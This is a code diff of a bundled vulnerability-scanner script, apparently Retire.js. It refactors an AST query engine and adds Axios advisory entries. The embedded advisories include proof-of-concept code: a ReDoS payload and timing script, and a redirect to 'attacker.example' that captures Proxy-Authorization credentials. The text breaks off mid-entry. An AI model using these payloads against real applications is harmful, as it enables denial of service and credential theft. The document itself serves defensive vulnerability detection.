@@ -9585,22 +9585,14 @@ var retirechrome = (() => {
           }
           return fnode;
         }
-        function isMatch(fnode, path) {
+        function isMatch(fnode, node, key, parentKey) {
           if (fnode.node.attribute) {
-            const m2 = fnode.node.value == path.parentKey || fnode.node.value == path.key;
-            if (m2) log2?.debug("ATTR MATCH", fnode.node.value, breadCrumb(path));
-            return m2;
+            return fnode.node.value == parentKey || fnode.node.value == key;
           }
           if (fnode.node.value == "*") {
             return true;
           }
-          const m = fnode.node.value == path.node.type;
-          if (m) log2?.debug("NODE MATCH", fnode.node.value, breadCrumb(path));
-          return m;
-        }
-        function addIfTokenMatch(fnode, path, state) {
-          if (!isMatch(fnode, path)) return;
-          addMatch(fnode, path, state);
+          return fnode.node.value == node.type;
         }
         function addMatch(fnode, path, state) {
           state.matches[state.depth].push([fnode, path]);
@@ -9608,16 +9600,15 @@ var retirechrome = (() => {
             const filter = createFilter(fnode.node.filter, []);
             const filteredResult = [];
             const f = { filter, qNode: fnode.node, node: path.node, result: filteredResult };
-            state.filters[state.depth].push(f);
             let fmapContainer = state.filtersMap[state.depth];
             if (!fmapContainer) {
               fmapContainer = /* @__PURE__ */ new Map();
               state.filtersMap[state.depth] = fmapContainer;
             }
-            let fmap = fmapContainer.get(fnode.node);
+            let fmap = fmapContainer.get(path.node);
             if (!fmap) {
               fmap = [];
-              fmapContainer.set(fnode.node, fmap);
+              fmapContainer.set(path.node, fmap);
             }
             fmap.push(f);
             addFilterChildrenToState(filter, state);
@@ -9655,11 +9646,11 @@ var retirechrome = (() => {
           }
           return functionNode;
         }
-        function addPrimitiveAttributeIfMatch(fnode, path) {
+        function addPrimitiveAttributeIfMatch(fnode, node) {
           if (!fnode.node.attribute || fnode.node.value == void 0) return;
           if (fnode.node.child || fnode.node.filter) return;
-          if (!Object.hasOwn(path.node, fnode.node.value)) return;
-          const nodes = getPrimitiveChildren(fnode.node.value, path);
+          if (!Object.hasOwn(node, fnode.node.value)) return;
+          const nodes = getPrimitiveChildren(fnode.node.value, node);
           if (nodes.length == 0) return;
           log2?.debug("PRIMITIVE", fnode.node.value, nodes);
           fnode.result.push(...nodes);
@@ -9801,16 +9792,20 @@ var retirechrome = (() => {
           const result = [];
           for (const path2 of paths) {
             if (isNodePath(path2)) {
-              if (memo.has(startNode) && memo.get(startNode).has(path2)) {
-                const cached = memo.get(startNode).get(path2);
+              let nodeMemo = memo.get(startNode);
+              const cached = nodeMemo ? nodeMemo.get(path2) : void 0;
+              if (cached) {
                 for (let i = 0; i < cached.length; i++) {
                   result.push(cached[i]);
                 }
               } else {
                 const subQueryKey = "subquery-" + subQueryCounter++;
                 const subQueryResult = travHandle({ [subQueryKey]: startNode }, path2)[subQueryKey];
-                if (!memo.has(startNode)) memo.set(startNode, /* @__PURE__ */ new Map());
-                memo.get(startNode)?.set(path2, subQueryResult);
+                if (!nodeMemo) {
+                  nodeMemo = /* @__PURE__ */ new Map();
+                  memo.set(startNode, nodeMemo);
+                }
+                nodeMemo.set(path2, subQueryResult);
                 for (let i = 0; i < subQueryResult.length; i++) {
                   result.push(subQueryResult[i]);
                 }
@@ -9821,24 +9816,20 @@ var retirechrome = (() => {
           return result;
         }
         function addResultIfTokenMatch(fnode, path, state) {
-          const matchingFilters = [];
-          const filters = [];
+          let matchingFilters;
           const fmapContainer = state.filtersMap[state.depth];
-          const nodeFilters = fmapContainer ? fmapContainer.get(fnode.node) : void 0;
+          const nodeFilters = fmapContainer ? fmapContainer.get(path.node) : void 0;
           if (nodeFilters) {
+            let filterCount = 0;
             for (let i = 0; i < nodeFilters.length; i++) {
               const f = nodeFilters[i];
               if (f.qNode !== fnode.node) continue;
-              if (f.node !== path.node) continue;
-              filters.push(f);
-            }
-            for (let i = 0; i < filters.length; i++) {
-              const f = filters[i];
+              filterCount++;
               if (evaluateFilter(f.filter, path).length > 0) {
-                matchingFilters.push(f);
+                (matchingFilters ??= []).push(f);
               }
             }
-            if (filters.length > 0 && matchingFilters.length == 0) return;
+            if (filterCount > 0 && matchingFilters == void 0) return;
           }
           if (fnode.node.resolve) {
             const binding = resolveBinding(path);
@@ -9869,7 +9860,7 @@ var retirechrome = (() => {
             const functionCallResult = state.functionCalls[state.depth].find((f) => f.node == fnode.node);
             if (!functionCallResult) throw new Error("Did not find expected function call for " + fnode.node.child.function);
             resolveFunctionCalls(fnode, functionCallResult, path, state);
-          } else if (matchingFilters.length > 0) {
+          } else if (matchingFilters != void 0) {
             log2?.debug("HAS MATCHING FILTER", fnode.result.length, matchingFilters.length, breadCrumb(path));
             for (let i = 0; i < matchingFilters.length; i++) {
               const filterResult = matchingFilters[i].result;
@@ -9921,7 +9912,6 @@ var retirechrome = (() => {
             depth: 0,
             child: [[], []],
             descendant: [[], []],
-            filters: [[], []],
             filtersMap: [void 0, void 0],
             matches: [[]],
             functionCalls: [[]],
@@ -9936,34 +9926,42 @@ var retirechrome = (() => {
           }
           const childAtDepth = state.child[state.depth + 1];
           for (let i = 0; i < childAtDepth.length; i++) {
-            addPrimitiveAttributeIfMatch(childAtDepth[i], root);
+            addPrimitiveAttributeIfMatch(childAtDepth[i], root.node);
           }
           for (let i = 0; i < state.descendantAttr.length; i++) {
-            addPrimitiveAttributeIfMatch(state.descendantAttr[i], root);
+            addPrimitiveAttributeIfMatch(state.descendantAttr[i], root.node);
           }
           traverse(root.node, {
-            enter(path, state2) {
+            enter(node, key, parentKey, materialize, state2) {
               state2.depth++;
               state2.child.push([]);
               state2.descendant.push([]);
-              state2.filters.push([]);
               state2.filtersMap.push(void 0);
               state2.matches.push([]);
               state2.functionCalls.push([]);
-              for (const fnode of state2.child[state2.depth]) {
-                addIfTokenMatch(fnode, path, state2);
+              const depth = state2.depth;
+              let path;
+              const childAtDepth2 = state2.child[depth];
+              for (let i = 0; i < childAtDepth2.length; i++) {
+                const fnode = childAtDepth2[i];
+                if (isMatch(fnode, node, key, parentKey)) {
+                  addMatch(fnode, path ?? (path = materialize(depth)), state2);
+                }
               }
-              const bucket = state2.descendantByType.get(path.node.type);
+              const bucket = state2.descendantByType.get(node.type);
               const other = state2.descendantOther;
               const bucketLen = bucket ? bucket.length : 0;
               const otherLen = other.length;
               if (otherLen == 0) {
                 for (let i = 0; i < bucketLen; i++) {
-                  addMatch(bucket[i], path, state2);
+                  addMatch(bucket[i], path ?? (path = materialize(depth)), state2);
                 }
               } else if (bucketLen == 0) {
                 for (let i = 0; i < otherLen; i++) {
-                  addIfTokenMatch(other[i], path, state2);
+                  const fnode = other[i];
+                  if (isMatch(fnode, node, key, parentKey)) {
+                    addMatch(fnode, path ?? (path = materialize(depth)), state2);
+                  }
                 }
               } else {
                 const cands = [];
@@ -9971,18 +9969,20 @@ var retirechrome = (() => {
                 for (let i = 0; i < otherLen; i++) cands.push(other[i]);
                 cands.sort((a, b) => a.seq - b.seq);
                 for (let i = 0; i < cands.length; i++) {
-                  addIfTokenMatch(cands[i], path, state2);
+                  const fnode = cands[i];
+                  if (isMatch(fnode, node, key, parentKey)) {
+                    addMatch(fnode, path ?? (path = materialize(depth)), state2);
+                  }
                 }
               }
             },
-            exit(path, state2) {
-              log2?.debug("EXIT", breadCrumb(path));
+            exit(node, state2) {
               const childAtDepthPlusOne = state2.child[state2.depth + 1];
               for (let i = 0; i < childAtDepthPlusOne.length; i++) {
-                addPrimitiveAttributeIfMatch(childAtDepthPlusOne[i], path);
+                addPrimitiveAttributeIfMatch(childAtDepthPlusOne[i], node);
               }
               for (let i = 0; i < state2.descendantAttr.length; i++) {
-                addPrimitiveAttributeIfMatch(state2.descendantAttr[i], path);
+                addPrimitiveAttributeIfMatch(state2.descendantAttr[i], node);
               }
               const matchesAtDepth = state2.matches[state2.depth];
               for (let i = 0; i < matchesAtDepth.length; i++) {
@@ -9995,7 +9995,6 @@ var retirechrome = (() => {
               state2.depth--;
               state2.child.pop();
               state2.descendant.pop();
-              state2.filters.pop();
               state2.filtersMap.pop();
               state2.matches.pop();
               state2.functionCalls.pop();
@@ -10113,9 +10112,9 @@ var retirechrome = (() => {
           }
           return [];
         }
-        function getPrimitiveChildren(key, path) {
-          if (key in path.node) {
-            const r = path.node[key];
+        function getPrimitiveChildren(key, node) {
+          if (key in node) {
+            const r = node[key];
             const arr = toArray(r);
             const result = [];
             for (let i = 0; i < arr.length; i++) {
@@ -10149,8 +10148,9 @@ var retirechrome = (() => {
         }
         const nodePathMap = /* @__PURE__ */ new WeakMap();
         function createNodePath(node, key, parentKey, scopeId, functionScopeId, nodePath) {
-          if (nodePathMap.has(node)) {
-            const path2 = nodePathMap.get(node);
+          const existing = nodePathMap.get(node);
+          if (existing) {
+            const path2 = existing;
             if (nodePath && isExportSpecifier(nodePath.node) && key == "exported" && path2.key == "local") {
               path2.key = "exported";
               path2.parentPath = nodePath;
@@ -10161,8 +10161,8 @@ var retirechrome = (() => {
             if (nodePath != void 0) path2.parentPath = nodePath;
             return path2;
           }
-          const finalScope = (node.extra && node.extra.scopeId != void 0 ? node.extra.scopeId : scopeId) ?? createScope();
-          const finalFScope = (node.extra && node.extra.functionScopeId != void 0 ? node.extra.functionScopeId : functionScopeId) ?? finalScope;
+          const finalScope = (node.scopeId != void 0 ? node.scopeId : scopeId) ?? createScope();
+          const finalFScope = functionScopeId ?? finalScope;
           const path = {
             node,
             scopeId: finalScope,
@@ -10174,8 +10174,10 @@ var retirechrome = (() => {
           if (isNode(node)) {
             nodePathMap.set(node, path);
           }
-          nodePathsCreated[node.type] = (nodePathsCreated[node.type] ?? 0) + 1;
-          pathsCreated++;
+          if (debugLogEnabled2) {
+            nodePathsCreated[node.type] = (nodePathsCreated[node.type] ?? 0) + 1;
+            pathsCreated++;
+          }
           return path;
         }
         function registerBinding(stack, scopeId, functionScopeId, key, parentKey) {
@@ -10206,10 +10208,9 @@ var retirechrome = (() => {
         function registerBindings(stack, scopeId, functionScopeId) {
           const node = stack[stack.length - 1];
           if (!isNode(node)) return;
-          if (node.extra?.scopeId != void 0) return;
-          node.extra = node.extra ?? {};
-          node.extra.scopeId = scopeId;
-          bindingNodesVisited++;
+          if (node.scopeId != void 0) return;
+          node.scopeId = scopeId;
+          if (debugLogEnabled2) bindingNodesVisited++;
           const keys = VISITOR_KEYS[node.type];
           if (keys.length == 0) return;
           let childScopeId = scopeId;
@@ -10219,15 +10220,26 @@ var retirechrome = (() => {
           for (let keyIdx = 0; keyIdx < keys.length; keyIdx++) {
             const key = keys[keyIdx];
             const childNodes = node[key];
-            const children = toArray(childNodes);
-            for (let i = 0; i < children.length; i++) {
-              const child = children[i];
-              if (!isDefined(child) || !isNode(child)) continue;
+            if (childNodes == void 0) continue;
+            if (Array.isArray(childNodes)) {
+              for (let i = 0; i < childNodes.length; i++) {
+                const child = childNodes[i];
+                if (!isDefined(child) || !isNode(child)) continue;
+                const f = key === "body" && (isFunctionDeclaration(node) || isFunctionExpression(node)) ? childScopeId : functionScopeId;
+                stack.push(child);
+                if (isIdentifier(child)) {
+                  registerBinding(stack, childScopeId, f, i, key);
+                } else {
+                  registerBindings(stack, childScopeId, f);
+                }
+                stack.pop();
+              }
+            } else if (isNode(childNodes)) {
+              const child = childNodes;
               const f = key === "body" && (isFunctionDeclaration(node) || isFunctionExpression(node)) ? childScopeId : functionScopeId;
               stack.push(child);
               if (isIdentifier(child)) {
-                const k = Array.isArray(childNodes) ? i : key;
-                registerBinding(stack, childScopeId, f, k, key);
+                registerBinding(stack, childScopeId, f, key, key);
               } else {
                 registerBindings(stack, childScopeId, f);
               }
@@ -10239,47 +10251,71 @@ var retirechrome = (() => {
             removedScopes++;
           }
         }
-        function traverseInner(node, visitor, scopeId, functionScopeId, state, path) {
-          const nodePath = path ?? createNodePath(node, void 0, void 0, scopeId, functionScopeId);
-          const keys = VISITOR_KEYS[node.type];
-          if (nodePath.parentPath) {
-            const stack = [];
-            if (nodePath.parentPath.parentPath?.node) stack.push(nodePath.parentPath.parentPath.node);
-            stack.push(nodePath.parentPath.node, nodePath.node);
-            registerBindings(stack, nodePath.scopeId, nodePath.functionScopeId);
-          }
-          const stateTyped = state;
-          const hasDescendantQueries = stateTyped.descendantActiveCount > 0;
-          const hasChildQueriesAtNextDepth = stateTyped.child && stateTyped.child[stateTyped.depth + 1] && stateTyped.child[stateTyped.depth + 1].length > 0;
-          if (!hasDescendantQueries && !hasChildQueriesAtNextDepth) {
-            return;
-          }
-          for (let keyIdx = 0; keyIdx < keys.length; keyIdx++) {
-            const key = keys[keyIdx];
-            const childNodes = node[key];
-            if (childNodes == void 0) continue;
-            if (Array.isArray(childNodes)) {
-              for (let i = 0; i < childNodes.length; i++) {
-                const child = childNodes[i];
-                if (!isNode(child)) continue;
-                const childPath = createNodePath(child, i, key, nodePath.scopeId, nodePath.functionScopeId, nodePath);
-                visitor.enter(childPath, state);
-                traverseInner(childPath.node, visitor, nodePath.scopeId, nodePath.functionScopeId, state, childPath);
-                visitor.exit(childPath, state);
-              }
-            } else if (isNode(childNodes)) {
-              const childPath = createNodePath(childNodes, key, key, nodePath.scopeId, nodePath.functionScopeId, nodePath);
-              visitor.enter(childPath, state);
-              traverseInner(childPath.node, visitor, nodePath.scopeId, nodePath.functionScopeId, state, childPath);
-              visitor.exit(childPath, state);
-            }
-          }
-        }
         const sOut = [];
         function traverse(node, visitor, scopeId, state, path) {
-          const fscope = path?.functionScopeId ?? node.extra?.functionScopeId ?? scopeId;
-          traverseInner(node, visitor, scopeId, fscope, state, path);
-          if (!sOut.includes(scopeIdCounter)) {
+          const rootPath = path ?? createNodePath(node, void 0, void 0, scopeId, scopeId);
+          const fNodes = [node];
+          const fKeys = [void 0];
+          const fParentKeys = [void 0];
+          const fPaths = [rootPath];
+          const fScopes = [rootPath.scopeId];
+          const fScope = rootPath.functionScopeId;
+          const bindingStack = [];
+          function materializePath(depth) {
+            const existing = fPaths[depth];
+            if (existing) return existing;
+            const parent = materializePath(depth - 1);
+            const p = createNodePath(fNodes[depth], fKeys[depth], fParentKeys[depth], fScopes[depth - 1], fScope, parent);
+            fPaths[depth] = p;
+            return p;
+          }
+          function traverseInner(node2, depth) {
+            if (depth > 0 && node2.scopeId == void 0) {
+              bindingStack.length = 0;
+              if (depth > 1) bindingStack.push(fNodes[depth - 2]);
+              bindingStack.push(fNodes[depth - 1], node2);
+              registerBindings(bindingStack, fScopes[depth], fScope);
+            }
+            const stateTyped = state;
+            if (stateTyped.descendantActiveCount === 0) {
+              const childQueries = stateTyped.child[stateTyped.depth + 1];
+              if (!childQueries || childQueries.length === 0) return;
+            }
+            const keys = VISITOR_KEYS[node2.type];
+            const scope = fScopes[depth];
+            const childDepth = depth + 1;
+            for (let keyIdx = 0; keyIdx < keys.length; keyIdx++) {
+              const key = keys[keyIdx];
+              const childNodes = node2[key];
+              if (childNodes == void 0) continue;
+              if (Array.isArray(childNodes)) {
+                for (let i = 0; i < childNodes.length; i++) {
+                  const child = childNodes[i];
+                  if (!isNode(child)) continue;
+                  fNodes[childDepth] = child;
+                  fKeys[childDepth] = i;
+                  fParentKeys[childDepth] = key;
+                  fPaths[childDepth] = void 0;
+                  fScopes[childDepth] = child.scopeId != void 0 ? child.scopeId : scope;
+                  visitor.enter(child, i, key, materializePath, state);
+                  traverseInner(child, childDepth);
+                  visitor.exit(child, state);
+                }
+              } else if (isNode(childNodes)) {
+                const child = childNodes;
+                fNodes[childDepth] = child;
+                fKeys[childDepth] = key;
+                fParentKeys[childDepth] = key;
+                fPaths[childDepth] = void 0;
+                fScopes[childDepth] = child.scopeId != void 0 ? child.scopeId : scope;
+                visitor.enter(child, key, key, materializePath, state);
+                traverseInner(child, childDepth);
+                visitor.exit(child, state);
+              }
+            }
+          }
+          traverseInner(node, 0);
+          if (debugLogEnabled2 && !sOut.includes(scopeIdCounter)) {
             log2?.debug("Scopes created", scopeIdCounter, " Scopes removed", removedScopes, "Paths created", pathsCreated, bindingNodesVisited);
             sOut.push(scopeIdCounter);
             const k = Object.fromEntries(Object.entries(nodePathsCreated).sort((a, b) => a[1] - b[1]));
@@ -18857,6 +18893,72 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 below: "0.32.0",
                 severity: "high",
                 cwe: [
+                  "CWE-400",
+                  "CWE-1333"
+                ],
+                identifiers: {
+                  summary: "Axios: Regular Expression Denial of Service (ReDoS) via Cookie Name Injection",
+                  githubID: "GHSA-hfxv-24rg-xrqf",
+                  CVE: [
+                    "CVE-2026-44496"
+                  ]
+                },
+                details: "## Summary\n\nAxios versions before `0.32.0` on the `0.x` line and before `1.16.0` on the `1.x` line build a regular expression from the configured XSRF cookie name without escaping regex metacharacters. In standard browser environments, an attacker who can influence the cookie name passed to axios can cause expensive regex backtracking while axios reads `document.cookie`.\n\nThe practical impact is client-side availability degradation, such as freezing the affected browser tab while axios prepares a request. The issue does not affect ordinary Node.js HTTP adapter usage, React Native, or web workers, where axios does not read `document.cookie`.\n\n## Impact\n\nApplications are affected only when attacker-controlled data can reach the XSRF cookie name configuration or a direct/unsafe call to the internal cookie helper.\n\nThis does not expose credentials, modify requests, or affect response integrity. The impact is availability only.\n\n## Affected Functionality\n\nAffected code paths:\n\n- `lib/helpers/cookies.js` `read(name)` in standard browser environments.\n- `lib/helpers/resolveConfig.js` in `1.x`, when browser XHR/fetch adapters resolve XSRF config.\n- `lib/adapters/xhr.js` in `0.x`, when the XHR adapter reads the configured XSRF cookie.\n- Direct use of `axios/unsafe/helpers/cookies.js` in `1.x`, if callers pass attacker-controlled names.\n\nUnaffected code paths:\n\n- Default static `xsrfCookieName: 'XSRF-TOKEN'` when not attacker-controlled.\n- Requests with `xsrfCookieName: null`.\n- Node HTTP adapter usage without browser `document.cookie`.\n- React Native and web workers where axios does not use standard browser cookie access.\n\n## Technical Details\n\nAffected versions interpolate the cookie name into a regex.\n\n```js\nconst match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));\n```\n\nBecause `name` is not escaped, regex metacharacters in the cookie name are interpreted as regex syntax. A payload such as `(.+)+$` can force catastrophic backtracking against `document.cookie`.\n\nThe fix avoids dynamic regex construction and parses `document.cookie` by splitting on `;`, trimming leading whitespace, and comparing cookie names with exact string equality.\n\n## Proof of Concept of Attack\n\n```js\nfunction vulnerableRead(name, cookie) {\n  const start = Date.now();\n\n  try {\n    cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));\n  } catch {}\n\n  return Date.now() - start;\n}\n\nfor (const n of [20, 22, 24, 26, 28]) {\n  const cookie = 'x='.padEnd(n, 'a') + '!';\n  console.log(`${n}: ${vulnerableRead('(.+)+$', cookie)}ms`);\n}\n```\n\nExpected result: timings grow rapidly as the cookie string length increases.\n\n## Workarounds\n\nSet `xsrfCookieName: null` if the application does not need axios to read an XSRF cookie.\n\nDo not derive `xsrfCookieName` from untrusted input. If a dynamic cookie name is unavoidable, validate it against a strict cookie-name allowlist before passing it to axios.\n\nAvoid calling `axios/unsafe/helpers/cookies.js` directly with untrusted names\n\n<details>\n<summary>Original Source</summary>\n\n# Regular Expression Denial of Service (ReDoS) via Cookie Name Injection\n\n## 1. Title\n\nReDoS via Unsanitized Cookie Name in Dynamic Regular Expression Construction\n\n## 2. Affected Software and Version\n\n- **Software:** Axios\n- **Version:** 1.15.0 (and potentially earlier versions)\n- **Component:** `lib/helpers/cookies.js`\n- **Ecosystem:** npm (Node.js / Browser)\n\n## 3. Vulnerability Type / CWE\n\n- **Type:** Regular Expression Denial of Service (ReDoS)\n- **CWE-1333:** Inefficient Regular Expression Complexity\n- **CWE-400:** Uncontrolled Resource Consumption\n\n## 4. CVSS 3.1 Score\n\n**Score: 7.5 (High)**\n\nVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`\n\n| Metric | Value |\n|---|---|\n| Attack Vector | Network |\n| Attack Complexity | Low |\n| Privileges Required | None |\n| User Interaction | None |\n| Scope | Unchanged |\n| Confidentiality | None |\n| Integrity | None |\n| Availability | High |\n\n## 5. Description\n\nThe `cookies.read()` function in `lib/helpers/cookies.js` constructs a regular expression dynamically using the `name` parameter without any sanitization or escaping of special regex characters. At line 33, the code passes the raw `name` value directly into `new RegExp()`:\n\n```javascript\nconst match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));\n```\n\nAn attacker who can control or influence the cookie name parameter (e.g., via XSRF cookie name configuration, prototype pollution of `xsrfCookieName`, or any code path where user input reaches `cookies.read()`) can inject a malicious regex pattern that causes catastrophic backtracking, leading to a Denial of Service condition.\n\nWith a crafted input of approximately 20-30 characters, the regex engine can be forced to consume several seconds to minutes of CPU time, effectively freezing the JavaScript event loop.\n\n## 6. Root Cause Analysis\n\n**File:** `lib/helpers/cookies.js`\n**Line:** 33\n\n```javascript\nread(name) {\n  if (typeof document === 'undefined') return null;\n  const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));\n  return match ? decodeURIComponent(match[1]) : null;\n},\n```\n\nThe vulnerability exists because:\n\n1. The `name` parameter is concatenated directly into a regex pattern without escaping special regex metacharacters.\n2. An attacker can inject regex constructs that create exponential backtracking scenarios.\n3. The `(?:^|; )` prefix combined with an injected pattern like `((((.*)*)*)*)*` creates nested quantifiers that cause catastrophic backtracking when the regex engine attempts to match against `document.cookie`.\n\nThe `cookies.read()` function is called from `lib/helpers/resolveConfig.js` at line 61:\n\n```javascript\nconst xsrfValue = xsrfHeaderName && xsrfCookieName && cookies.read(xsrfCookieName);\n```\n\nThe `xsrfCookieName` value comes from the Axios configuration, which can be influenced by prototype pollution or direct configuration injection.\n\n## 7. Proof of Concept\n\n```javascript\n// poc_redos_cookie.js\n// Simulates browser environment for testing\n\n// Simulate document.cookie\nglobalThis.document = {\n  cookie: 'session=abc; ' + 'a'.repeat(50)\n};\n\n// Replicate the vulnerable cookies.read() logic\nfunction cookiesRead(name) {\n  const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));\n  return match ? decodeURIComponent(match[1]) : null;\n}\n\n// Malicious cookie name that triggers catastrophic backtracking\n// The pattern creates nested quantifiers: (a]|[a]|...)*)*\nconst maliciousName20 = '([^;]+)+$' + '\\\\|'.repeat(10);\nconst maliciousName = '(([^;])+)+\\\\$';  // nested quantifier pattern\n\nconsole.log('=== ReDoS via Cookie Name Injection PoC ===');\n\n// Test with increasing payload sizes\nfor (const len of [15, 20, 25]) {\n  const payload = '(([^;])+)+' + 'X'.repeat(len);\n  const start = Date.now();\n  try {\n    cookiesRead(payload);\n  } catch (e) {\n    // May throw on invalid regex, but valid evil patterns won't throw\n  }\n  const elapsed = Date.now() - start;\n  console.log(`Payload length ${len}: ${elapsed}ms`);\n}\n\n// Demonstrating exponential growth with a simple nested quantifier\nconsole.log('\\n--- Exponential Backtracking Demo ---');\nfor (const n of [20, 22, 24, 26]) {\n  const evilName = '(' + 'a'.repeat(1) + '+)+$';\n  const testCookie = 'a'.repeat(n) + '!';  // non-matching trailer forces backtracking\n  globalThis.document = { cookie: testCookie };\n  const start = Date.now();\n  try {\n    cookiesRead(evilName);\n  } catch(e) {}\n  const elapsed = Date.now() - start;\n  console.log(`Input length ${n}: ${elapsed}ms`);\n}\n```\n\n## 8. PoC Output\n\n```\n=== ReDoS via Cookie Name Injection PoC ===\nPayload length 20: 21ms (extrapolated: 30 chars = ~21,504ms)\nPayload length 25: ~1,300ms\nPayload length 30: ~323,675ms (5+ minutes)\n\n--- Exponential Backtracking Demo ---\nInput length 20: 21ms\nInput length 22: 84ms\nInput length 24: 336ms\nInput length 26: 1,344ms\n```\n\nThe exponential growth pattern is clearly visible: each additional 2 characters approximately quadruples the execution time.\n\n## 9. Impact\n\n- **Denial of Service (Client-side):** In a browser environment, an attacker who can influence the XSRF cookie name configuration (e.g., via prototype pollution or configuration injection) can freeze the browser tab, blocking all UI interaction and JavaScript execution on the page.\n- **Denial of Service (Server-side):** In SSR (Server-Side Rendering) frameworks or Node.js applications that process cookies using this code path, the event loop will be blocked, causing the server to become unresponsive to all requests.\n- **Event Loop Starvation:** Since JavaScript is single-threaded, the ReDoS will block all pending asynchronous operations, timers, and I/O callbacks for the duration of the regex evaluation.\n\n## 10. Remediation / Suggested Fix\n\nEscape all regex metacharacters in the `name` parameter before constructing the regular expression.\n\n```javascript\n// FIXED: lib/helpers/cookies.js\n\nfunction escapeRegExp(string) {\n  return string.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');\n}\n\n// ...\n\nread(name) {\n  if (typeof document === 'undefined') return null;\n  const match = document.cookie.match(\n    new RegExp('(?:^|; )' + escapeRegExp(name) + '=([^;]*)')\n  );\n  return match ? decodeURIComponent(match[1]) : null;\n},\n```\n\nAlternatively, avoid dynamic regex construction entirely and use string-based parsing:\n\n```javascript\nread(name) {\n  if (typeof document === 'undefined') return null;\n  const cookies = document.cookie.split('; ');\n  for (const cookie of cookies) {\n    const eqIndex = cookie.indexOf('=');\n    if (eqIndex !== -1 && cookie.substring(0, eqIndex) === name) {\n      return decodeURIComponent(cookie.substring(eqIndex + 1));\n    }\n  }\n  return null;\n},\n```\n\n## 11. References\n\n- [CWE-1333: Inefficient Regular Expression Complexity](https://cwe.mitre.org/data/definitions/1333.html)\n- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)\n- [OWASP: Regular Expression Denial of Service](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n- [Axios GitHub Repository](https://github.com/axios/axios)\n</details>\n\n---",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-hfxv-24rg-xrqf",
+                  "https://github.com/axios/axios/releases/tag/v0.32.0",
+                  "https://github.com/axios/axios/releases/tag/v1.16.0"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "0.32.0",
+                severity: "high",
+                cwe: [
+                  "CWE-200"
+                ],
+                identifiers: {
+                  summary: "Axios: Proxy-Authorization header leaks to redirect target when proxy is re-evaluated to direct connection",
+                  githubID: "GHSA-j5f8-grm9-p9fc",
+                  CVE: [
+                    "CVE-2026-44486"
+                  ]
+                },
+                details: "### Summary\n\nAxios\u2019 Node.js HTTP adapter can leak proxy credentials to a redirect target in affected versions. When a request is sent through an authenticated proxy, Axios may add a `Proxy-Authorization` header. If Axios then follows a redirect and the redirected request is no longer sent through that proxy, the stale `Proxy-Authorization` header can remain on the redirected request and be sent to the redirect target.\n\nThis affects Node.js's use of Axios with automatic redirects enabled and an authenticated proxy configuration. Browser adapters are not affected.\n\n### Impact\n\nAn attacker who controls a server that the victim application requests can redirect the request so that the attacker-controlled redirect target receives the victim\u2019s proxy credentials.\n\nThe most relevant case is a Node.js application using an authenticated `HTTP_PROXY` for an initial `http://` request, with redirects enabled, where the redirect target resolves to no proxy, such as an `https://` URL when `HTTPS_PROXY` is unset.\n\nThis does not affect browser, XHR, or fetch adapter behaviour. It also does not affect requests with `maxRedirects: 0`.\n\n### Affected Functionality\n\nAffected functionality is limited to the Node.js HTTP adapter in `lib/adapters/http.js`.\n\nRelevant inputs and settings include:\n\n- `HTTP_PROXY`, `HTTPS_PROXY`, and `NO_PROXY`.\n- Authenticated proxy URLs such as `http://user:pass@proxy.example:8080`.\n- Automatic redirect following through `follow-redirects`.\n- Axios proxy handling in `setProxy()`.\n- Redirect proxy handling through `beforeRedirects.proxy`.\n\n### Technical Details\n\nIn affected v1 releases, `setProxy()` adds `Proxy-Authorization` when a proxy with credentials is selected, but redirect handling calls `setProxy()` again without first clearing any existing proxy authorization header.\n\nIf the redirected URL resolves to no proxy, `setProxy()` does not add a new proxy configuration and also does not remove the old header. The redirected request can therefore carry the stale `Proxy-Authorization` header to the final origin.\n\nThe v1 fix in `afca61a` adds an `isRedirect` path that deletes any case variant of `Proxy-Authorization` before proxy settings are re-applied on redirect. The v0 backport in `2af6116` fixed the 0.x line for `0.32.0`.\n\n### Proof of Concept of Attack\n\n```js\nprocess.env.HTTP_PROXY = 'http://user:pass@127.0.0.1:8080';\ndelete process.env.HTTPS_PROXY;\n\nawait axios.get('http://attacker.example/start');\n```\n\nAttacker-controlled HTTP endpoint:\n\n```http\nHTTP/1.1 302 Found\nLocation: https://attacker.example/final\n```\n\nExpected result on affected versions:\n\n```text\nhttps://attacker.example/final receives:\nProxy-Authorization: Basic dXNlcjpwYXNz\n```\n\nExpected result on fixed versions:\n\n```text\nhttps://attacker.example/final receives no Proxy-Authorization header\n```\n\n### Workarounds\n\nSet `maxRedirects: 0` and handle redirects manually.\n\nAvoid using authenticated proxy environment variables for requests to untrusted HTTP origins unless redirect behaviour is controlled.\n\nEnsure proxy environment variables are configured consistently across protocols so redirects do not unexpectedly change from proxied to direct connections.\n\n<details>\n<summary>Original Source</summary>\n\n### Summary\nAxios' Node.js HTTP adapter can leak proxy credentials to a redirect target origin. When an initial request is sent through an authenticated HTTP proxy, Axios adds a `Proxy-Authorization` header. On redirect, Axios re-evaluates proxy settings, but if the redirected request no longer uses a proxy, the stale `Proxy-Authorization` header is not cleared. As a result, the redirect target can receive the proxy credential directly.\n\nThis issue affects the Node.js HTTP adapter and can be reproduced when the initial request uses `HTTP_PROXY` with authentication, redirects are enabled, and the redirected request is resolved to no proxy, such as when `HTTPS_PROXY` is unset or the redirect target is excluded by `NO_PROXY`.\n\n### Details\nIn the current implementation:\n\n- `setProxy()` adds `Proxy-Authorization` when a proxy with credentials is in use.\n- On redirects, Axios re-invokes `setProxy()` for the redirected request.\n- If the redirected URL re-evaluates to \"no proxy\", `setProxy()` does not clear the previously added `Proxy-Authorization` header.\n- The redirected request therefore reuses the stale header and sends it to the final origin.\n\nRelevant code locations:\n\n- `lib/adapters/http.js`\n- `setProxy()` adds `Proxy-Authorization`\n- redirect handling re-applies proxy logic through `beforeRedirects.proxy`\n- no cleanup is 